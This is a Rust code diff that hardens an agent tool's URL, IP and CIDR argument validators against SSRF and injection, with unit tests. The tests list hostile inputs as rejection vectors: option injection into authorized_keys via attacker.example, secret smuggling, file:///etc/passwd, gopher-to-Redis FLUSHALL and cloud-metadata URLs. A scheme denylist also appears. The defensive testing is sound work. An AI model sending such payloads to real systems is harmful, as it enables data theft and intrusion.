@@ -1,3 +1,6 @@
+use crate::hostpolicy::{
+    enforce_ip_policy, has_punycode_label, looks_like_ip_literal, parse_canonical_ip,
+};
 use crate::types::{ArgDef, ToolCladError};
 use regex::Regex;
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
@@ -37,8 +40,29 @@ static HOSTNAME_RE: LazyLock<Regex> = LazyLock::new(|| {
     )
     .unwrap()
 });
-static URL_RE: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"^https?://[a-zA-Z0-9\-\.]+(/[^\s]*)?$").unwrap());
+/// Schemes a `url` argument accepts when the manifest sets no `schemes`.
+const DEFAULT_URL_SCHEMES: &[&str] = &["http", "https"];
+
+/// Schemes a `url` argument never accepts, even when a manifest lists one in
+/// `schemes`: each is either a non-network scheme a fetcher would turn into
+/// local file or code access, or a protocol-smuggling vector (gopher and dict
+/// speak raw bytes to an arbitrary port).
+const DENIED_URL_SCHEMES: &[&str] = &[
+    "javascript",
+    "data",
+    "file",
+    "blob",
+    "about",
+    "gopher",
+    "dict",
+    "ftp",
+    "ldap",
+    "jar",
+    "netdoc",
+    "mailto",
+    "ws",
+    "wss",
+];
 
 /// Types whose value is user text handed to the target binary more or less
 /// verbatim. They get the W1.5 hygiene rules (NUL, control characters,
@@ -125,8 +149,8 @@ pub fn validate_arg_mode(
             .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
         "boolean" => validate_boolean(name, val),
         "enum" => validate_enum(name, def, val),
-        "ip_address" => validate_ip_address(name, val),
-        "cidr" => validate_cidr(name, val),
+        "ip_address" => validate_ip_address(name, def, val),
+        "cidr" => validate_cidr(name, def, val),
         _ => Err(ToolCladError::ValidationError(format!(
             "unknown argument type '{}' for '{}'",
             def.type_name, name
@@ -465,28 +489,6 @@ fn validate_scope_target(name: &str, def: &ArgDef, val: &str) -> Result<String, 
     }
 }
 
-/// Parse only canonical IP text (dotted-quad IPv4 / standard IPv6). Rejects
-/// integer, hex, octal, and shorthand encodings by construction.
-fn parse_canonical_ip(val: &str) -> Option<IpAddr> {
-    val.parse::<Ipv4Addr>()
-        .map(IpAddr::V4)
-        .or_else(|_| val.parse::<Ipv6Addr>().map(IpAddr::V6))
-        .ok()
-}
-
-/// True if `val` is an attempt at an IP literal in a non-canonical encoding:
-/// a `0x…` hex form, or every dot-separated label is all ASCII digits
-/// (integer / dotted-decimal / octal / shorthand). Canonical IPs are handled
-/// earlier and never reach here.
-fn looks_like_ip_literal(val: &str) -> bool {
-    let lower = val.to_ascii_lowercase();
-    if lower.starts_with("0x") {
-        return true;
-    }
-    val.split('.')
-        .all(|label| !label.is_empty() && label.bytes().all(|b| b.is_ascii_digit()))
-}
-
 /// True if the rightmost DNS label is not entirely numeric (a real TLD is never
 /// all digits). Rejects e.g. `example.123` and dotted-decimal IPs.
 fn tld_not_all_numeric(val: &str) -> bool {
@@ -496,125 +498,183 @@ fn tld_not_all_numeric(val: &str) -> bool {
     }
 }
 
-/// Reason if `ip` must be blocked regardless of policy: link-local
-/// (169.254.0.0/16, fe80::/10), which includes the cloud-metadata endpoint
-/// 169.254.169.254. No agent tool has a legitimate reason to reach these, and
-/// the blast radius (instance-credential theft) is maximal — so block always,
-/// even when `block_internal` is off. v4-mapped IPv6 is unwrapped.
-fn always_blocked_ip_reason(ip: &IpAddr) -> Option<&'static str> {
-    let v4 = match ip {
-        IpAddr::V4(a) => Some(*a),
-        IpAddr::V6(a) => a.to_ipv4_mapped(),
-    };
-    if let Some(a) = v4 {
-        return a.is_link_local().then_some(
-            "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked",
-        );
-    }
-    if let IpAddr::V6(a) = ip {
-        if (a.segments()[0] & 0xffc0) == 0xfe80 {
-            return Some("is an IPv6 link-local address (fe80::/10) — always blocked");
-        }
-    }
-    None
+/// The host part of a URL authority, split from its optional port.
+#[derive(Debug, PartialEq, Eq)]
+struct UrlHost<'a> {
+    host: &'a str,
+    /// Validated port, when one was written.
+    port: Option<u16>,
+    /// Set when the host was a bracketed IPv6 literal, already parsed.
+    bracketed_v6: Option<Ipv6Addr>,
 }
 
-/// Enforce the egress policy for a resolved target IP: link-local / metadata is
-/// always blocked; the remaining non-public ranges are blocked only under the
-/// opt-in `block_internal` policy.
-fn enforce_ip_policy(name: &str, ip: &IpAddr, block_internal: bool) -> Result<(), ToolCladError> {
-    if let Some(reason) = always_blocked_ip_reason(ip) {
+/// Split a URL authority (everything between `://` and the first `/`, `?` or
+/// `#`, with userinfo already refused) into host and port. A bracketed IPv6
+/// literal is unwrapped; an unbracketed one is ambiguous with a port and
+/// refused. A written port must be 1–65535 in plain decimal digits.
+fn split_url_authority<'a>(name: &str, authority: &'a str) -> Result<UrlHost<'a>, ToolCladError> {
+    let malformed_v6 = || {
+        ToolCladError::ValidationError(format!(
+            "argument '{name}' URL has a malformed bracketed IPv6 host"
+        ))
+    };
+
+    let (host, port_text, bracketed_v6) = if let Some(after_open) = authority.strip_prefix('[') {
+        let (inner, after_close) = after_open.split_once(']').ok_or_else(malformed_v6)?;
+        let port_text = match after_close {
+            "" => None,
+            p => Some(p.strip_prefix(':').ok_or_else(malformed_v6)?),
+        };
+        let v6 = inner.parse::<Ipv6Addr>().map_err(|_| {
+            ToolCladError::ValidationError(format!(
+                "argument '{name}' URL bracketed host is not a valid IPv6 literal"
+            ))
+        })?;
+        (inner, port_text, Some(v6))
+    } else {
+        match authority.rsplit_once(':') {
+            Some((h, p)) => (h, Some(p), None),
+            None => (authority, None, None),
+        }
+    };
+
+    if host.is_empty() {
         return Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' target {reason}"
+            "argument '{name}' URL has an empty host"
         )));
     }
-    if block_internal {
-        if let Some(reason) = non_public_ip_reason(ip) {
-            return Err(ToolCladError::ValidationError(format!(
-                "argument '{name}' target {reason} (blocked by block_internal policy)"
-            )));
-        }
+    if bracketed_v6.is_none() && host.contains(':') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL IPv6 host must be enclosed in brackets"
+        )));
     }
-    Ok(())
-}
 
-/// Returns a reason string if `ip` is a non-public address that SSRF defenses
-/// should block: loopback, private, link-local (incl. cloud metadata), etc.
-/// IPv6 v4-mapped addresses are unwrapped so `::ffff:127.0.0.1` is caught.
-fn non_public_ip_reason(ip: &IpAddr) -> Option<&'static str> {
-    let v4 = match ip {
-        IpAddr::V4(a) => Some(*a),
-        IpAddr::V6(a) => a.to_ipv4_mapped(),
+    let port = match port_text {
+        None => None,
+        Some(p) => {
+            // Plain decimal only: `u16::from_str` would accept a leading `+`.
+            let parsed = if !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()) {
+                p.parse::<u16>().ok().filter(|n| *n >= 1)
+            } else {
+                None
+            };
+            Some(parsed.ok_or_else(|| {
+                ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL port must be 1-65535"
+                ))
+            })?)
+        }
     };
-    if let Some(a) = v4 {
-        return if a.is_loopback() {
-            Some("resolves to a loopback address")
-        } else if a.is_private() {
-            Some("resolves to a private address")
-        } else if a.is_link_local() {
-            Some("resolves to a link-local address (e.g. cloud metadata 169.254.169.254)")
-        } else if a.is_unspecified() {
-            Some("is the unspecified address 0.0.0.0")
-        } else if a.is_broadcast() {
-            Some("is the broadcast address")
-        } else if a.is_documentation() {
-            Some("is a documentation-range address")
-        } else {
-            None
-        };
-    }
-    if let IpAddr::V6(a) = ip {
-        if a.is_loopback() {
-            return Some("resolves to the IPv6 loopback ::1");
-        }
-        if a.is_unspecified() {
-            return Some("is the IPv6 unspecified address ::");
-        }
-        let first = a.segments()[0];
-        if (first & 0xfe00) == 0xfc00 {
-            return Some("is an IPv6 unique-local address (fc00::/7)");
-        }
-        if (first & 0xffc0) == 0xfe80 {
-            return Some("is an IPv6 link-local address (fe80::/10)");
-        }
-    }
-    None
+
+    Ok(UrlHost {
+        host,
+        port,
+        bracketed_v6,
+    })
 }
 
-/// Returns true if any DNS label in `host` is an A-label (`xn--…`).
-/// Comparison is case-insensitive per IDNA: `XN--`, `Xn--`, `xN--` all count.
-fn has_punycode_label(host: &str) -> bool {
-    host.split('.')
-        .any(|label| label.len() >= 4 && label.as_bytes()[..4].eq_ignore_ascii_case(b"xn--"))
-}
-
+/// The `url` validator, in order: the string-derived hygiene has already run
+/// (whitespace is never admitted for a `url`, opt-in or not); then the shell
+/// metacharacter blocklist, which rejects `{` and `}` and therefore any
+/// `{_secret:…}` reference; then a structural parse — `scheme://`, the scheme
+/// allowlist, the scheme denylist, no userinfo, host extraction with an
+/// optional port — and finally the host policy of `crate::hostpolicy`.
+///
+/// This is deliberately not a WHATWG / RFC 3986 normalizer. The fetcher
+/// downstream will parse the value again with its own rules, so anything a
+/// human reviewer of the manifest could misread is refused here rather than
+/// normalized away.
 fn validate_url(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
     reject_injection(name, val)?;
-    if !URL_RE.is_match(val) {
+
+    // Step 2: `scheme://rest`.
+    let Some((scheme, rest)) = val.split_once("://") else {
         return Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' is not a valid URL"
+            "argument '{name}' is not a valid URL (expected scheme://host)"
+        )));
+    };
+    let scheme = scheme.to_ascii_lowercase();
+
+    // Step 3: allowlist — the manifest's `schemes` when set, else http/https.
+    let allowed: Vec<String> = if def.schemes.is_empty() {
+        DEFAULT_URL_SCHEMES.iter().map(|s| s.to_string()).collect()
+    } else {
+        def.schemes.iter().map(|s| s.to_ascii_lowercase()).collect()
+    };
+    if !allowed.contains(&scheme) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL scheme '{scheme}' is not permitted (allowed: {})",
+            allowed.join(", ")
         )));
     }
-    // Apply the same host hygiene as scope_target — curl/wget-style fetchers are
-    // the prime SSRF vector. URL_RE guarantees `scheme://host[/path]` with a
-    // simple host (no port/userinfo/brackets), so the host is everything between
-    // "://" and the first "/".
-    let host = val
-        .split_once("://")
-        .map(|(_, rest)| rest.split('/').next().unwrap_or(""))
-        .unwrap_or("");
+
+    // Step 4: explicit denial, even when a manifest lists the scheme.
+    if DENIED_URL_SCHEMES.contains(&scheme.as_str()) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL scheme '{scheme}' is never permitted for a url argument"
+        )));
+    }
+
+    // Step 5: the authority ends at the first `/`, `?` or `#`. An `@` before
+    // that is userinfo, which hides the real host from a reviewer.
+    let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let authority = &rest[..authority_end];
+    if authority.contains('@') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL must not contain userinfo (user:pass@host)"
+        )));
+    }
+
+    // Step 6: host and optional port.
+    let UrlHost {
+        host,
+        port: _,
+        bracketed_v6,
+    } = split_url_authority(name, authority)?;
+
+    // Step 7: host policy — the same checks as `scope_target`, since curl and
+    // wget-style fetchers are the prime SSRF vector.
     if has_punycode_label(host) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' URL host must not contain punycode (xn--) labels"
         )));
     }
-    if let Some(ip) = parse_canonical_ip(host) {
-        enforce_ip_policy(name, &ip, def.block_internal)?;
-    } else if looks_like_ip_literal(host) {
-        return Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' URL host looks like a non-canonical IP literal; use dotted-quad IPv4 or a hostname"
-        )));
+    let ip = bracketed_v6
+        .map(IpAddr::V6)
+        .or_else(|| parse_canonical_ip(host));
+    match ip {
+        Some(ip) => enforce_ip_policy(name, &ip, def.block_internal)?,
+        None => {
+            if !host.is_ascii() {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host must be ASCII (IDN hostnames are rejected to prevent homoglyph bypass)"
+                )));
+            }
+            if looks_like_ip_literal(host) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host looks like a non-canonical IP literal; use dotted-quad IPv4 or a hostname"
+                )));
+            }
+            if host.len() > SCOPE_TARGET_MAX_LEN || host.split('.').any(|label| label.len() > 63) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host exceeds DNS length limits (RFC 1035 §2.3.4)"
+                )));
+            }
+            if !HOSTNAME_RE.is_match(host) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host is not a valid hostname or IP literal"
+                )));
+            }
+            // Hostname strengthening (internal-suffix denylist, embedded IP
+            // literals, DNS resolution under `block_internal`) plugs in here
+            // in a later wave, via `crate::hostpolicy`.
+        }
     }
+
+    // Step 8 — SCOPE HOOK: when `def.scope_check` is set, the scope checker
+    // (a later wave) is consulted here with `host`. Not implemented yet; the
+    // flag is parsed and carried so manifests can already declare it.
+
     Ok(val.to_string())
 }
 
@@ -634,32 +694,40 @@ fn validate_path(name: &str, val: &str) -> Result<String, ToolCladError> {
     Ok(val.to_string())
 }
 
-fn validate_ip_address(name: &str, val: &str) -> Result<String, ToolCladError> {
-    if val.parse::<Ipv4Addr>().is_ok() || val.parse::<Ipv6Addr>().is_ok() {
-        Ok(val.to_string())
-    } else {
-        Err(ToolCladError::ValidationError(format!(
+/// A canonical IPv4 or IPv6 literal, under the same egress policy as every
+/// other address-carrying type: link-local is always refused, the rest of the
+/// non-public table under `block_internal`.
+fn validate_ip_address(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
+    match parse_canonical_ip(val) {
+        Some(ip) => {
+            enforce_ip_policy(name, &ip, def.block_internal)?;
+            Ok(val.to_string())
+        }
+        None => Err(ToolCladError::ValidationError(format!(
             "argument '{name}' is not a valid IP address"
-        )))
+        ))),
     }
 }
 
-fn validate_cidr(name: &str, val: &str) -> Result<String, ToolCladError> {
+fn validate_cidr(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
     if let Some(caps) = CIDR_V4_RE.captures(val) {
         let ip_part = &caps[1];
         let prefix: u8 = caps[2].parse().map_err(|_| {
             ToolCladError::ValidationError(format!("argument '{name}' has invalid CIDR prefix"))
         })?;
-        if ip_part.parse::<Ipv4Addr>().is_err() {
-            return Err(ToolCladError::ValidationError(format!(
+        let base = ip_part.parse::<Ipv4Addr>().map_err(|_| {
+            ToolCladError::ValidationError(format!(
                 "argument '{name}' has invalid IPv4 address in CIDR"
-            )));
-        }
+            ))
+        })?;
         if prefix > 32 {
             return Err(ToolCladError::ValidationError(format!(
                 "argument '{name}' CIDR prefix must be 0-32"
             )));
         }
+        // The policy applies to the base address. Testing the whole range
+        // for overlap with each blocked prefix is a later wave.
+        enforce_ip_policy(name, &IpAddr::V4(base), def.block_internal)?;
         Ok(val.to_string())
     } else {
         Err(ToolCladError::ValidationError(format!(
@@ -1591,5 +1659,474 @@ mod tests {
         assert!(
             validate_arg_with_custom_types_mode("s", &spaced, "a b", &custom_any, true).is_ok()
         );
+    }
+
+    // ---- url validator (W3) and host policy (W4) ----
+
+    fn url_arg(block_internal: bool, schemes: &[&str]) -> ArgDef {
+        ArgDef {
+            type_name: "url".to_string(),
+            block_internal,
+            schemes: schemes.iter().map(|s| s.to_string()).collect(),
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn test_url_injection_vectors_inline() {
+        // Mirrors every `url-*` vector in tests/injection_vectors.json; a
+        // later wave reads the file directly.
+        struct Vector {
+            id: &'static str,
+            value: &'static str,
+            block_internal: bool,
+            schemes: &'static [&'static str],
+            accept: bool,
+        }
+        let vectors = [
+            Vector {
+                id: "url-space-option-injection",
+                value: "https://attacker.example/ -o /root/.ssh/authorized_keys",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-space-write-tmp",
+                value: "https://attacker.example/ -o /tmp/pwned",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-secret-smuggling",
+                value: "https://attacker.example/?k={_secret:api_key}",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-javascript-scheme",
+                value: "javascript:alert(1)",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-file-scheme",
+                value: "file:///etc/passwd",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-data-scheme",
+                value: "data:text/html,<script>1</script>",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-gopher-redis",
+                value: "gopher://127.0.0.1:6379/_FLUSHALL",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-dict-scheme",
+                value: "dict://127.0.0.1:11211/stat",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-userinfo",
+                value: "http://user:pw@example.com/",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-metacharacter",
+                value: "https://attacker.example/;id",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-scheme-not-in-list",
+                value: "http://example.com/",
+                block_internal: false,
+                schemes: &["https"],
+                accept: false,
+            },
+            Vector {
+                id: "url-imds-always-blocked",
+                value: "http://169.254.169.254/latest/meta-data/",
+                block_internal: false,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-docker-socket-block-internal",
+                value: "http://127.0.0.1:2375/containers/json",
+                block_internal: true,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-ipv6-loopback-block-internal",
+                value: "http://[::1]:8080/",
+                block_internal: true,
+                schemes: &[],
+                accept: false,
+            },
+            Vector {
+                id: "url-accept",
+                value: "https://example.com/path",
+                block_internal: false,
+                schemes: &[],
+                accept: true,
+            },
+            Vector {
+                id: "url-accept-public-ip-block-internal",
+                value: "https://93.184.216.34/x",
+                block_internal: true,
+                schemes: &[],
+                accept: true,
+            },
+        ];
+        for v in &vectors {
+            let def = url_arg(v.block_internal, v.schemes);
+            let result = validate_arg("u", &def, v.value);
+            assert_eq!(result.is_ok(), v.accept, "{}: {result:?}", v.id);
+        }
+    }
+
+    #[test]
+    fn test_url_honors_schemes_list() {
+        // The regression this wave closes: Rust ignored `schemes` entirely.
+        let https_only = url_arg(false, &["https"]);
+        let err = validate_arg("u", &https_only, "http://example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("scheme 'http' is not permitted"), "{err}");
+        assert!(validate_arg("u", &https_only, "https://example.com/").is_ok());
+        // Case-insensitive on both sides.
+        assert!(validate_arg("u", &https_only, "HTTPS://example.com/").is_ok());
+        assert!(validate_arg("u", &url_arg(false, &["HTTPS"]), "https://example.com/").is_ok());
+        // A custom scheme can be allowed when it is not on the denylist, and
+        // listing it drops the defaults.
+        let custom = url_arg(false, &["custom"]);
+        assert!(validate_arg("u", &custom, "custom://example.com/").is_ok());
+        assert!(validate_arg("u", &custom, "https://example.com/").is_err());
+        // Unset means http + https.
+        let def = make_arg("url");
+        assert!(validate_arg("u", &def, "http://example.com/").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com/").is_ok());
+        let err = validate_arg("u", &def, "custom://example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("allowed: http, https"), "{err}");
+    }
+
+    #[test]
+    fn test_url_denied_schemes_even_when_listed() {
+        for scheme in [
+            "javascript",
+            "data",
+            "file",
+            "blob",
+            "about",
+            "gopher",
+            "dict",
+            "ftp",
+            "ldap",
+            "jar",
+            "netdoc",
+            "mailto",
+            "ws",
+            "wss",
+        ] {
+            let def = url_arg(false, &[scheme]);
+            let value = format!("{scheme}://example.com/x");
+            let err = validate_arg("u", &def, &value).unwrap_err().to_string();
+            assert!(err.contains("never permitted"), "{scheme}: {err}");
+            // Mixed case does not slip past the denylist.
+            let upper = format!("{}://example.com/x", scheme.to_ascii_uppercase());
+            assert!(validate_arg("u", &def, &upper).is_err(), "{upper}");
+        }
+        // Not listed: the ordinary allowlist message applies.
+        let err = validate_arg("u", &make_arg("url"), "file:///etc/passwd")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("not permitted"), "{err}");
+    }
+
+    #[test]
+    fn test_url_structure() {
+        let def = make_arg("url");
+        // No scheme separator.
+        let err = validate_arg("u", &def, "example.com/path")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("expected scheme://host"), "{err}");
+        assert!(validate_arg("u", &def, "javascript:alert(1)").is_err());
+        // Userinfo hides the real host from a reviewer.
+        let err = validate_arg("u", &def, "http://user:pw@example.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("userinfo"), "{err}");
+        assert!(validate_arg("u", &def, "http://evil.example@example.com/").is_err());
+        // An `@` after the authority is just path or query data.
+        assert!(validate_arg("u", &def, "https://example.com/@handle").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com/?to=a@b").is_ok());
+        // Empty host.
+        for v in ["http:///path", "http://", "http://:8080/", "http://?q=1"] {
+            let err = validate_arg("u", &def, v).unwrap_err().to_string();
+            assert!(err.contains("empty host"), "{v}: {err}");
+        }
+        // Query or fragment directly after the host, and no path at all.
+        assert!(validate_arg("u", &def, "https://example.com").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com?q=1").is_ok());
+        assert!(validate_arg("u", &def, "https://example.com#frag").is_ok());
+        // Unbracketed IPv6 is ambiguous with a port.
+        let err = validate_arg("u", &def, "http://::1/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("enclosed in brackets"), "{err}");
+        assert!(validate_arg("u", &def, "https://example.com:80:80/").is_err());
+        // Host character set and DNS limits.
+        assert!(validate_arg("u", &def, "http://exa_mple.com/").is_err());
+        assert!(validate_arg("u", &def, "http://-example.com/").is_err());
+        assert!(validate_arg("u", &def, "http://exa%41mple.com/").is_err());
+        let err = validate_arg("u", &def, "http://exämple.com/")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("ASCII"), "{err}");
+        let long_label = format!("http://{}.com/", "a".repeat(64));
+        assert!(validate_arg("u", &def, &long_label).is_err());
+        assert!(validate_arg("u", &def, &format!("http://{}.com/", "a".repeat(63))).is_ok());
+        // Whitespace is never admitted, even in exec mode with the opt-in.
+        let mut lenient = make_arg("url");
+        lenient.allow_whitespace = true;
+        assert!(validate_arg_mode("u", &lenient, "https://example.com/ -o x", true).is_err());
+    }
+
+    #[test]
+    fn test_url_ports() {
+        let def = make_arg("url");
+        for v in [
+            "https://example.com:8443/x",
+            "https://example.com:8443",
+            "https://example.com:1/",
+            "https://example.com:65535/",
+            "http://93.184.216.34:8080/x",
+        ] {
+            assert!(validate_arg("u", &def, v).is_ok(), "{v}");
+        }
+        for v in [
+            "https://example.com:0/x",
+            "https://example.com:99999/x",
+            "https://example.com:65536/",
+            "https://example.com:/x",
+            "https://example.com:+80/",
+            "https://example.com:8a/",
+        ] {
+            let err = validate_arg("u", &def, v).unwrap_err().to_string();
+            assert!(err.contains("port must be 1-65535"), "{v}: {err}");
+        }
+    }
+
+    #[test]
+    fn test_url_authority_split_unwraps_bracketed_ipv6() {
+        // `[` and `]` are shell metacharacters, so a bracketed literal never
+        // reaches the structural parse through validate_arg; the splitter is
+        // exercised directly so the unwrap stays correct.
+        let h = split_url_authority("u", "[::1]:8080").unwrap();
+        assert_eq!(h.host, "::1");
+        assert_eq!(h.port, Some(8080));
+        assert_eq!(h.bracketed_v6, Some(Ipv6Addr::LOCALHOST));
+        let h = split_url_authority("u", "[2001:db8::1]").unwrap();
+        assert_eq!(h.port, None);
+        assert_eq!(h.bracketed_v6, Some("2001:db8::1".parse().unwrap()));
+        assert_eq!(
+            split_url_authority("u", "example.com:8443").unwrap(),
+            UrlHost {
+                host: "example.com",
+                port: Some(8443),
+                bracketed_v6: None,
+            }
+        );
+        assert_eq!(
+            split_url_authority("u", "example.com").unwrap(),
+            UrlHost {
+                host: "example.com",
+                port: None,
+                bracketed_v6: None,
+            }
+        );
+        for bad in [
+            "[::1",
+            "[::1]x",
+            "[::1]:",
+            "[::1]:0",
+            "[]",
+            "[example.com]",
+            "[::1]]",
+            "",
+            ":80",
+        ] {
+            assert!(split_url_authority("u", bad).is_err(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn test_url_block_internal_policy() {
+        let blocking = url_arg(true, &[]);
+        for v in [
+            "http://127.0.0.1/",
+            "http://127.0.0.1:2375/containers/json",
+            "http://[::1]:8080/",
+            "http://10.0.0.5/x",
+            "http://192.168.1.1/",
+            "http://172.16.0.1/",
+            "http://100.64.0.1/",
+            "http://0.0.0.0/",
+            "http://198.18.0.1/",
+            "http://240.0.0.1/",
+            "http://192.0.2.1/",
+            "http://255.255.255.255/",
+        ] {
+            let err = validate_arg("u", &blocking, v).unwrap_err().to_string();
+            assert!(
+                err.contains("block_internal") || err.contains("metacharacter"),
+                "{v}: {err}"
+            );
+        }
+        assert!(validate_arg("u", &blocking, "https://93.184.216.34/x").is_ok());
+        assert!(validate_arg("u", &blocking, "https://example.com/").is_ok());
+        // Off by default: internal literals pass, except the always-blocked
+        // tier.
+        let open = make_arg("url");
+        for v in [
+            "http://127.0.0.1/",
+            "http://10.0.0.5/x",
+            "http://100.64.0.1/",
+            "http://198.18.0.1/",
+            "http://240.0.0.1/",
+        ] {
+            assert!(validate_arg("u", &open, v).is_ok(), "{v}");
+        }
+    }
+
+    #[test]
+    fn test_url_imds_blocked_in_both_modes() {
+        for block_internal in [false, true] {
+            let def = url_arg(block_internal, &[]);
+            for v in [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254:80/",
+                "http://169.254.0.1/",
+            ] {
+                let err = validate_arg("u", &def, v).unwrap_err().to_string();
+                assert!(err.contains("always blocked"), "{v}: {err}");
+            }
+            // The v4-mapped spelling needs brackets in a URL, which the
+            // metacharacter rule refuses first; the policy itself is checked
+            // on the literal directly.
+            assert!(validate_arg("u", &def, "http://[::ffff:169.254.169.254]/").is_err());
+            let mapped: IpAddr = "::ffff:169.254.169.254".parse().unwrap();
+            let err = enforce_ip_policy("u", &mapped, block_internal)
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("always blocked"), "{err}");
+        }
+    }
+
+    #[test]
+    fn test_scope_target_block_internal_full_table() {
+        let def = blocking_arg();
+        for v in [
+            "10.0.0.5",
+            "192.168.1.1",
+            "172.16.0.1",
+            "0.0.0.0",
+            "0.1.2.3",
+            "::1",
+            "::",
+            "fc00::1",
+            "::ffff:127.0.0.1",
+            "100.64.0.1",
+            "198.18.0.1",
+            "240.0.0.1",
+            "255.255.255.255",
+            "192.0.2.1",
+            "198.51.100.1",
+            "203.0.113.1",
+            "2001:db8::1",
+            "100.64.0.0/10",
+            "198.18.0.0/15",
+        ] {
+            let err = validate_arg("t", &def, v).unwrap_err().to_string();
+            assert!(
+                err.contains("blocked by block_internal policy"),
+                "{v}: {err}"
+            );
+        }
+        assert!(validate_arg("t", &def, "93.184.216.34").is_ok());
+        assert!(validate_arg("t", &def, "2606:2800:220:1:248:1893:25c8:1946").is_ok());
+        assert!(validate_arg("t", &def, "8.8.8.0/24").is_ok());
+        // The newly covered ranges stay open without the policy.
+        let open = make_arg("scope_target");
+        for v in [
+            "100.64.0.1",
+            "198.18.0.1",
+            "240.0.0.1",
+            "2001:db8::1",
+            "0.1.2.3",
+        ] {
+            assert!(validate_arg("t", &open, v).is_ok(), "{v}");
+        }
+    }
+
+    #[test]
+    fn test_ip_address_and_cidr_apply_host_policy() {
+        let open_ip = make_arg("ip_address");
+        assert!(validate_arg("ip", &open_ip, "10.0.0.1").is_ok());
+        let err = validate_arg("ip", &open_ip, "169.254.169.254")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("always blocked"), "{err}");
+        assert!(validate_arg("ip", &open_ip, "fe80::1").is_err());
+        let block_ip = ArgDef {
+            type_name: "ip_address".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        for v in [
+            "10.0.0.1",
+            "127.0.0.1",
+            "::1",
+            "::ffff:192.168.0.1",
+            "100.64.1.1",
+        ] {
+            let err = validate_arg("ip", &block_ip, v).unwrap_err().to_string();
+            assert!(err.contains("block_internal"), "{v}: {err}");
+        }
+        assert!(validate_arg("ip", &block_ip, "93.184.216.34").is_ok());
+
+        let open_cidr = make_arg("cidr");
+        assert!(validate_arg("c", &open_cidr, "10.0.0.0/24").is_ok());
+        assert!(validate_arg("c", &open_cidr, "169.254.0.0/16").is_err());
+        let block_cidr = ArgDef {
+            type_name: "cidr".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        assert!(validate_arg("c", &block_cidr, "10.0.0.0/24").is_err());
+        assert!(validate_arg("c", &block_cidr, "198.18.0.0/15").is_err());
+        assert!(validate_arg("c", &block_cidr, "8.8.8.0/24").is_ok());
     }
 }
